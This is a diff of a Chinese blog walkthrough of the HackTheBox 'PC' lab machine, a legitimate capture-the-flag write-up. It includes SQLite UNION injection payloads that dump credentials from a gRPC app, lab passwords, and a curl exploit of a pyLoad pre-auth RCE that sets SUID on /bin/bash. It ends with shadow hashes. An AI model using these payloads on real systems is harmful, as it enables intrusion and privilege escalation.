@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;PC 10.10.11.214   端口扫描需要全端口,有个50051： 123456789101112$ nmap -p- -Pn 10.10.11.214Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-05-22 16:01 CSTStats: 0:48:12 el">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;PC 10.10.11.214                                                                                                              端口扫描需要全端口,有个50051： 123456789101112">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PC - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/05/22/PC-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;PC 10.10.11.214   端口扫描需要全端口,有个50051： 123456789101112$ nmap -p- -Pn 10.10.11.214Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-05-22 16:01 CSTStats: 0:48:12 el">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;PC 10.10.11.214                                                                                                              端口扫描需要全端口,有个50051： 123456789101112">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052201.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052202.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052203.jpg">
@@ -130,7 +130,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -219,7 +219,14 @@
 <li><a href="https://app.hackthebox.com/machines/PC" target="_blank" rel="noopener">https://app.hackthebox.com/machines/PC</a></li>
 <li>10.10.11.214</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052201.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052201.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>需要全端口,有个50051：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -p- -Pn 10.10.11.214</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 16:01 CST</span><br><span class="line">Stats: 0:48:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 98.24% done; ETC: 16:50 (0:00:52 remaining)</span><br><span class="line">Nmap scan report for 10.10.11.214</span><br><span class="line">Host is up (0.093s latency).</span><br><span class="line">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">50051/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2940.26 seconds</span><br></pre></td></tr></table></figure>
 
@@ -233,34 +240,97 @@
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install grpcui</span><br><span class="line">grpcui -plaintext 10.10.11.214:50051</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052202.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052202.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="SimpleApp"><a href="#SimpleApp" class="headerlink" title="SimpleApp"></a>SimpleApp</h1><h2 id="LoginUser"><a href="#LoginUser" class="headerlink" title="LoginUser"></a>LoginUser</h2><p>直接使用 <code>admin : admin</code>登录，得到一个id和token：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;message&quot;: &quot;Your id is 678.&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ3NTMxNjN9.5ZKS24POhkcG5Cn1zYcGnV4E70CbFH6gcsEflzMDzvU</span><br></pre></td></tr></table></figure>
 
 <p>(下面的图是一开始自己注册登录得到的结果，懒得改成admin了)</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052203.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052203.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="getinfo"><a href="#getinfo" class="headerlink" title="getinfo"></a>getinfo</h2><p>然后使用得到的id和token调用getinfo：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052204.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052204.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>简单测试发现id处存在注入：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052205.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052206.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052205.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052206.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>后面就一步步注入获取数据，sqlite数据库：</p>
 <ul>
 <li>PayloadsAllTheThings/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHub<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</a></li>
 </ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">678 union <span class="keyword">select</span> sqlite_version()</span><br><span class="line"></span><br><span class="line"><span class="number">678</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> tbl_name <span class="keyword">FROM</span> sqlite_master <span class="keyword">WHERE</span> <span class="keyword">type</span>=<span class="string">'table'</span> <span class="keyword">and</span> tbl_name <span class="keyword">NOT</span> <span class="keyword">like</span> <span class="string">'sqlite_%'</span></span><br><span class="line">accounts</span><br><span class="line"></span><br><span class="line"><span class="number">678</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="keyword">sql</span> <span class="keyword">FROM</span> sqlite_master <span class="keyword">WHERE</span> <span class="keyword">type</span>!=<span class="string">'meta'</span> <span class="keyword">AND</span> <span class="keyword">sql</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">AND</span> <span class="keyword">name</span> =<span class="string">'accounts'</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">"accounts"</span> (username <span class="built_in">TEXT</span> <span class="keyword">UNIQUE</span>,<span class="keyword">password</span> <span class="built_in">TEXT</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">678</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="keyword">GROUP_CONCAT</span>(username) <span class="keyword">from</span> accounts</span><br><span class="line"><span class="keyword">admin</span>,sau</span><br><span class="line"><span class="number">678</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="keyword">GROUP_CONCAT</span>(<span class="keyword">password</span>) <span class="keyword">from</span> accounts</span><br><span class="line"><span class="keyword">admin</span>,HereIsYourPassWord1431</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052207.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052207.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的sau用户账号密码，ssh登录：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sau</span><br><span class="line">HereIsYourPassWord1431</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052208.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052208.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>简单枚举发现本地8000端口：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052209.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052209.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>转发出来查看，发现是pyLoad：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh sau@10.10.11.214 -L 8000:127.0.0.1:8000</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052210.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052210.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>搜索可以发现相关漏洞：</p>
 <ul>
 <li>Pre-auth RCE vulnerability found in pyload<br><a href="https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/" target="_blank" rel="noopener">https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/</a></li>
@@ -269,8 +339,22 @@
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>最简单的，直接给bash加个suid,注意编码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k -X $'POST' \</span><br><span class="line">    --data-binary $'jk=pyimport%20os;os.system(\"chmod%20%2bs%20/bin/bash\");f=function%20f2()&#123;&#125;;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa' \</span><br><span class="line">    $'http://127.0.0.1:8000/flash/addcrypted2'</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052211.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052212.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052211.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052212.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$DyP1KfBYGKoKi9P1$UiRaoILBpT81btxBn3Hzd5KmsRiijiMcR8J&#x2F;F7ULWYvIMVzicsE3s&#x2F;Yfyd20bypQUJ4utbJMRzYip4HT0s9ri.:19368:0:99999:7:::</span><br><span class="line">sau:$6$Gx2uZX1oO0Qx6c3z$DUQFBRdrpJRsMo098RVb&#x2F;o.QDhL.n9aKWRdjNrrn6VU4fnBkuhBOnjPz.Oiua5ZswZMrVn3UwfSje&#x2F;fUWkJYv.:19368:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
